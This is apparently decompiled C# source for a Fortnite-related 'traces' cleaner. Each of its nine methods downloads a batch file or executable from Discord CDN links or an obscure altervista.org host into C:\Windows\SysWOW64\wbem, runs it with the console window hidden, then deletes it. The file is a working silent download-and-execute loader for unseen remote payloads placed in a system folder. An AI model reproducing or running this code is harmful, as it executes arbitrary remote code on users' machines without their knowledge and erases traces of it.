using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace ConsoleApp1
{
	// Token: 0x02000007 RID: 7
	internal class Traces
	{
		// Token: 0x0600002E RID: 46 RVA: 0x000035D8 File Offset: 0x000017D8
		public static void Registry()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/620550821276549120/Registry.bat", "C:\\Windows\\SysWOW64\\wbem\\Registry.bat");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Registry.bat";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\Registry.bat");
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00003674 File Offset: 0x00001874
		public static void Fortnite()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/620550822123667457/Fortnite.bat", "C:\\Windows\\SysWOW64\\wbem\\Fortnite.bat");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Fortnite.bat";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\Fortnite.bat");
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00003710 File Offset: 0x00001910
		public static void Fortnite2()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/620550818596388874/Fortnite3.bat", "C:\\Windows\\SysWOW64\\wbem\\Fortnite3.bat");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Fortnite3.bat";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\Fortnite3.bat");
		}

		// Token: 0x06000031 RID: 49 RVA: 0x000037AC File Offset: 0x000019AC
		public static void Fortnite3()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/620551478544957448/Fortnite4.exe", "C:\\Windows\\SysWOW64\\wbem\\Fortnite4.exe");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Fortnite4.exe";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\Fortnite4.exe");
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00003848 File Offset: 0x00001A48
		public static void Fortnite4()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/620550823243546645/Fortnite2.bat", "C:\\Windows\\SysWOW64\\wbem\\Fortnite2.bat");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Fortnite2.bat";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\Fortnite2.bat");
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000038E4 File Offset: 0x00001AE4
		public static void Hostname()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("http://faew8f465a1f32d3sf1s.altervista.org/ChangeHostname.exe", "C:\\Windows\\SysWOW64\\wbem\\ChangeHostname.exe");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\ChangeHostname.exe";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\ChangeHostname.exe");
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00003980 File Offset: 0x00001B80
		public static void Registry2()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/624588070628360192/Registry.bat", "C:\\Windows\\SysWOW64\\wbem\\Registry.bat");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Registry.bat";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\Registry.bat");
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00003A1C File Offset: 0x00001C1C
		public static void Fortnite5()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/624588071916142595/FN.bat", "C:\\Windows\\SysWOW64\\wbem\\FN.bat");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\FN.bat";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\FN.bat");
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00003AB8 File Offset: 0x00001CB8
		public static void Fortnite6()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/551500669190799362/602180746509156540/cleaner.bat", "C:\\Windows\\SysWOW64\\wbem\\cleaner.bat");
			webClient.Proxy = null;
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\cleaner.bat";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\cleaner.bat");
		}
	}
}
